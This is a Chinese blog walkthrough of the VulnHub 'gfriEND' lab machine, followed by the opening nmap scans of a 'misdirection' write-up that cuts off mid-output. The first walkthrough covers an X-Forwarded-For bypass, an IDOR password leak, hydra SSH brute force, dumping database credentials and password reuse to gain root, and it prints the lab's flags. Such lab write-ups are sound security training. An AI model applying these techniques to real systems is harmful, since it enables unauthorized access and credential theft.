class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.118       <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 11:29 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.118<br>Host is up (0.00034s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /config/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.7 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /misc/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.7 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>MAC Address: 08:00:27:6E:E1:A4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 321.61 seconds<br><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描中给出了 robots.txt ，其中有个文件名 <code>heyhoo.txt</code> 打开发现：</p><p><img src="/pic/a9fa3d1b467d19f9970ba74e88e469f5_MD5.png"></p><p>并没有特别的提示，config 目录下有个 config.php 文件，但是下载不下来</p><p><img src="/pic/e4100fdc6c8249e6507c0e23fbc7bea2_MD5.png"></p><p>misc 目录下的文件也一样，无法下载</p><p><img src="/pic/40b0fd329bef0e3ca4ad55bc10df92d1_MD5.png"></p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>页面提示只运行本地访问</p><p><img src="/pic/5ca48ed729c2a02ab097291da66edbb5_MD5.png"></p><p>那也许 <code>x-forwarded-for:127.0.0.1</code> 可以绕过，使用 burp suite 进行尝试</p><p><img src="/pic/e8b0b5299c4c0d239763c3705cdd2e4f_MD5.png"></p><p>页面返回 302 也就是被重定向了。找了个插件来修改</p><p><img src="/pic/06295b271306b31409a1ee54bff0b1cc_MD5.png"></p><p><img src="/pic/836b388085244e65fa37f4775f6f378c_MD5.png"></p><p>返回的是个很朴素的界面，查看了一下，发现 profile 处可能有惊喜，它的 URL 很特殊</p><p><img src="/pic/e5ff194fddde991ea6482808438410b5_MD5.png"></p><p>修改 user_id 的值，发现返回的竟然是各个用户修改密码的界面，F12 调起控制台，修改 type&#x3D;”text”，成功获取到用户名和密码的对应</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">eweuhtandingan:</span>skuyatuh<br><span class="hljs-symbol">aingmaung:</span>qwerty!!!<br><span class="hljs-symbol">sundatea:</span>indONEsia<br><span class="hljs-symbol">sedihaingmah:</span>cedihhihihi<br><span class="hljs-symbol">alice:</span><span class="hljs-number">4</span>lic3<br></code></pre></td></tr></table></figure><h3 id="hydra-爆破ssh"><a href="#hydra-爆破ssh" class="headerlink" title="hydra 爆破ssh"></a>hydra 爆破ssh</h3><p>将其使用 awk 进行处理，分别存入 user 和 passwd 文件，随后考虑使用 hydra 进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/meandgirlfriend]<br>└─$ awk -F: <span class="hljs-string">&#x27;&#123; print $1 &#125;&#x27;</span> up &gt; user<br><br>┌──(kali㉿kali)-[~/Downloads/meandgirlfriend]<br>└─$ awk -F: <span class="hljs-string">&#x27;&#123; print $2 &#125;&#x27;</span> up &gt; passwd<br></code></pre></td></tr></table></figure><p>使用 hydra 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/meandgirlfriend]<br>└─$ hydra -L user -P passwd 192.168.56.118 ssh                    <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-22 22:28:40<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task<br>[DATA] attacking ssh://192.168.56.118:22/<br>[22][ssh] host: 192.168.56.118   login: alice   password: 4lic3<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-22 22:28:45<br></code></pre></td></tr></table></figure><p>得到了一个用户名和密码，尝试登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ ssh alice@192.168.56.118                 <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.118 (192.168.56.118)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:xQf3lfh03E3NNnt5rN/N5zVlGxJJo8QcKykWWCSg1SM.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.118<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">alice@192.168.56.118\&#x27;</span>s password: <br>Last login: Fri Dec 13 14:48:25 2019<br>alice@gfriEND:~$ <span class="hljs-built_in">whoami</span><br>alice<br>alice@gfriEND:/home$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:6e:e1:a4 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.118/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe6e:e1a4/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><br>alice@gfriEND:/home$ <span class="hljs-built_in">id</span><br>uid=1000(alice) gid=1001(alice) <span class="hljs-built_in">groups</span>=1001(alice)<br>alice@gfriEND:/home$ <span class="hljs-built_in">uname</span> -a<br>Linux gfriEND 4.4.0-142-generic <span class="hljs-comment">#168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>登录成功，查看家目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@gfriEND:~$ <span class="hljs-built_in">ls</span> -liah<br>total 32K<br> 21088 drwxr-xr-x 4 alice alice 4.0K Dec 13  2019 .<br>    12 drwxr-xr-x 6 root  root  4.0K Dec 13  2019 ..<br> 21128 -rw------- 1 alice alice   10 Dec 13  2019 .bash_history<br> 21090 -rw-r--r-- 1 alice alice  220 Dec 13  2019 .bash_logout<br> 21089 -rw-r--r-- 1 alice alice 3.6K Dec 13  2019 .bashrc<br> 21126 drwx------ 2 alice alice 4.0K Dec 13  2019 .cache<br>142082 drwxrwxr-x 2 alice alice 4.0K Dec 13  2019 .my_secret<br> 21091 -rw-r--r-- 1 alice alice  675 Dec 13  2019 .profile<br>alice@gfriEND:~$ <span class="hljs-built_in">cat</span> .bash_history <br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>alice@gfriEND:~$ <span class="hljs-built_in">cd</span> .my_secret/<br>alice@gfriEND:~/.my_secret$ <span class="hljs-built_in">ls</span> -liah<br>total 16K<br>142082 drwxrwxr-x 2 alice alice 4.0K Dec 13  2019 .<br> 21088 drwxr-xr-x 4 alice alice 4.0K Dec 13  2019 ..<br> 21104 -rw-r--r-- 1 root  root   306 Dec 13  2019 flag1.txt<br> 21087 -rw-rw-r-- 1 alice alice  119 Dec 13  2019 my_notes.txt<br>alice@gfriEND:~/.my_secret$ <span class="hljs-built_in">cat</span> flag1.txt<br>Greattttt my brother! You saw the Alice<span class="hljs-string">&#x27;s note! Now you save the record information to give to bob! I know if it&#x27;</span>s given to him <span class="hljs-keyword">then</span> Bob will be hurt but this is better than Bob cheated!<br><br>Now your last job is get access to the root and <span class="hljs-built_in">read</span> the flag ^_^<br><br>Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;<br><br>alice@gfriEND:~/.my_secret$ <span class="hljs-built_in">cat</span> my_notes.txt <br>Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn<span class="hljs-string">&#x27;t know my notes</span><br></code></pre></td></tr></table></figure><p>家目录中的一个隐藏文件夹中找到了第一个 flag，接下来考虑如何提权，依然进行信息收集。之前漏洞脚本扫描结果中有个 config 文件夹，去 www目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@gfriEND:/var/www/html$ ll<br>total 32<br>drwxr-xr-x 5 root root 4096 Dec 13  2019 ./<br>drwxr-xr-x 3 root root 4096 Dec 13  2019 ../<br>drwxrwxr-x 2 root root 4096 Dec 13  2019 config/<br>drwxrwxr-x 2 root root 4096 Dec 13  2019 halamanPerusahaan/<br>-rw-rw-r-- 1 root root   60 Dec 13  2019 heyhoo.txt<br>-rw-rw-r-- 1 root root 2446 Dec 13  2019 index.php<br>drwxrwxr-x 2 root root 4096 Dec 13  2019 misc/<br>-rw-rw-r-- 1 root root   32 Dec 13  2019 robots.txt<br>alice@gfriEND:/var/www/html$ <span class="hljs-built_in">cat</span> robots.txt<br>User-Agent: *<br>Allow: /heyhoo.txtalice@gfriEND:/var/www/html$ <span class="hljs-built_in">cat</span> heyhoo.txt <br>Great! What you need now is reconn, attack and got the shellalice@gfriEND:/var/www/html$ <span class="hljs-built_in">cd</span> config/<br>alice@gfriEND:/var/www/html/config$ ll<br>total 12<br>drwxrwxr-x 2 root root 4096 Dec 13  2019 ./<br>drwxr-xr-x 5 root root 4096 Dec 13  2019 ../<br>-rw-rw-r-- 1 root root   88 Dec 13  2019 config.php<br>alice@gfriEND:/var/www/html/config$ <span class="hljs-built_in">cat</span> config.php <br>&lt;?php<br><br>    <span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;ctf_pasti_bisa&#x27;</span>, <span class="hljs-string">&#x27;ceban_corp&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>得到了数据库的密码，先尝试登录数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@gfriEND:/var/www/html/config$ mysql -uroot -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 475<br>Server version: 5.5.64-MariaDB-1ubuntu0.14.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| ceban_corp         |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [(none)]&gt; use ceban_corp<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [ceban_corp]&gt; show tables;<br>+----------------------+<br>| Tables_in_ceban_corp |<br>+----------------------+<br>| tbl_users            |<br>+----------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [ceban_corp]&gt; <span class="hljs-keyword">select</span> * from tbl_users;<br>+----+-----------------+----------------+-------------+------------------------------+<br>| <span class="hljs-built_in">id</span> | name            | username       | password    | email                        |<br>+----+-----------------+----------------+-------------+------------------------------+<br>|  1 | Eweuh Tandingan | eweuhtandingan | skuyatuh    | eweuhtandingan@cebancorp.com |<br>|  2 | Aing Maung      | aingmaung      | qwerty!!!   | aingmaung@cebancorp.com      |<br>|  3 | Sunda Tea       | sundatea       | indONEsia   | sundatea@cebancorp.com       |<br>|  4 | Sedih Aing Mah  | sedihaingmah   | cedihhihihi | sedihaingmah@cebancorp.com   |<br>|  5 | Alice Geulis    | alice          | 4lic3       | alice@cebancorp.com          |<br>|  9 | Abdi Kasep      | abdikasepak    | dorrrrr     | abdikasep@cebancorp.com      |<br>| 12 | mini            | mini           | mini        | mini@gmail.com               |<br>+----+-----------------+----------------+-------------+------------------------------+<br>7 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>MariaDB [ceban_corp]&gt; <span class="hljs-built_in">exit</span><br>Bye<br></code></pre></td></tr></table></figure><p>数据库中有个之前没有处理到的 user_id 为 9 的用户，但是查看了下 passwd 文件中有 bash 权限的用户，并没有这个用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@gfriEND:/home$ <span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br>root:x:0:0:root:/root:/bin/bash<br>alice:x:1000:1001:Alice Geulis,1337,+62,+62:/home/alice:/bin/bash<br>eweuhtandingan:x:1001:1002:,,,:/home/eweuhtandingan:/bin/bash<br>aingmaung:x:1002:1003:,,,:/home/aingmaung:/bin/bash<br>sundatea:x:1003:1004:,,,:/home/sundatea:/bin/bash<br></code></pre></td></tr></table></figure><h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>因为现在有了两个新的密码，尝试分别尝试这两个密码看看是否存在密码重用的问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice@gfriEND:/var/www/html/config$ su -<br>Password: <br>root@gfriEND:~<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>数据库的密码就是 root 用户的密码，成功登录 root 用户，家目录下拿到了第二个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@gfriEND:~<span class="hljs-comment"># ll</span><br>total 32<br>drwx------  3 root root 4096 Dec 13  2019 ./<br>drwxr-xr-x 22 root root 4096 Dec 13  2019 ../<br>-rw-------  1 root root    0 Dec 13  2019 .bash_history<br>-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc<br>drwx------  2 root root 4096 Dec 13  2019 .cache/<br>-rw-r--r--  1 root root 1000 Dec 13  2019 flag2.txt<br>-rw-------  1 root root  238 Dec 13  2019 .mysql_history<br>-rw-------  1 root root   81 Dec 13  2019 .nano_history<br>-rw-r--r--  1 root root  140 Feb 20  2014 .profile<br>root@gfriEND:~<span class="hljs-comment"># cat flag2.txt</span><br><br>  ________        __    ___________.__             ___________.__                ._.<br> /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |<br>/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |<br>\    \_\  (  &lt;_&gt; )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  &gt;|<br> \______  /\____/|__|     |____|   |___|  /\___  &gt;  \___  /   |____(____  /\___  /__<br>        \/                              \/     \/       \/              \//_____/ \/<br><br>Yeaaahhhh!! You have successfully hacked this company server! I hope you <span class="hljs-built_in">who</span> have just learned can get new knowledge from here :) I really hope you guys give me feedback <span class="hljs-keyword">for</span> this challenge whether you like it or not because it can be a reference <span class="hljs-keyword">for</span> me to be even better! I hope this can <span class="hljs-built_in">continue</span> :)<br><br>Contact me <span class="hljs-keyword">if</span> you want to contribute / give me feedback / share your writeup!<br>Twitter: @makegreatagain_<br>Instagram: @aldodimas73<br><br>Thanks! Flag 2: gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>misdirection</title>
    <link href="/2023/06/efe95bcd539b.html"/>
    <url>/2023/06/efe95bcd539b.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Misdirection，vulnhub靶机，不难，但开始阶段很容易被误导，渗透目标选择的优先级容易选错以致费时，死磕一点还是快速跳跃，需要权衡、经验和智慧。用webshell获得系统立足点，两次提权获得root权限。这台机器很标准，其中多了一点点曲折和趣味，是高仿真场景的抽象，规模不大，但渗透体验很棒，细节满满。</p></blockquote><h1 id="misdirection-靶机"><a href="#misdirection-靶机" class="headerlink" title="misdirection 靶机"></a>misdirection 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.139                                  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-21 22:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00057s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 00:0C:29:20:A6:AD (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.32 seconds<br></code></pre></td></tr></table></figure><p>开放了 22，80，3306，8080 端口</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(kali㉿kali)-[~]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-sT</span> <span class="hljs-string">-sV</span> <span class="hljs-string">-O</span> <span class="hljs-string">-sC</span> <span class="hljs-string">-p22,80,3306,8080</span> <span class="hljs-number">192.1</span><span class="hljs-number">.1</span><span class="hljs-number">.139</span><br><span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.94</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2023-06-21 </span><span class="hljs-number">22</span><span class="hljs-string">:38</span> <span class="hljs-string">EDT</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">192.1</span><span class="hljs-number">.1</span><span class="hljs-number">.139</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.00024s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>     <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span> <span class="hljs-string">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ssh</span>     <span class="hljs-string">OpenSSH</span> <span class="hljs-number">7.</span><span class="hljs-string">6p1</span> <span class="hljs-string">Ubuntu</span> <span class="hljs-string">4ubuntu0.5</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-string">Linux;</span> <span class="hljs-string">protocol</span> <span class="hljs-number">2.0</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ssh-hostkey:</span> <br><span class="hljs-string">|</span>   <span class="hljs-number">2048 </span><span class="hljs-string">ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36</span> <span class="hljs-string">(RSA)</span><br><span class="hljs-string">|</span>   <span class="hljs-number">256</span> <span class="hljs-number">67</span><span class="hljs-string">:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87</span> <span class="hljs-string">(ECDSA)</span><br><span class="hljs-string">|_</span>  <span class="hljs-number">256</span> <span class="hljs-number">59</span><span class="hljs-string">:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d</span> <span class="hljs-string">(ED25519)</span><br><span class="hljs-number">80</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">http</span>    <span class="hljs-string">Rocket</span> <span class="hljs-string">httpd</span> <span class="hljs-number">1.2</span><span class="hljs-number">.6</span> <span class="hljs-string">(Python</span> <span class="hljs-number">2.7</span><span class="hljs-string">.15rc1)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Site</span> <span class="hljs-string">doesn\&#x27;t</span> <span class="hljs-string">have</span> <span class="hljs-string">a</span> <span class="hljs-string">title</span> <span class="hljs-string">(text/html;</span> <span class="hljs-string">charset=utf-8).</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Rocket</span> <span class="hljs-number">1.2</span><span class="hljs-number">.6</span> <span class="hljs-string">Python/2.7.15rc1</span><br><span class="hljs-number">3306</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">mysql</span>   <span class="hljs-string">MySQL</span> <span class="hljs-string">(unauthorized)</span><br><span class="hljs-number">8080</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>    <span class="hljs-string">Apache</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.4</span><span class="hljs-number">.29</span> <span class="hljs-string">((Ubuntu))</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Apache/2.4.29</span> <span 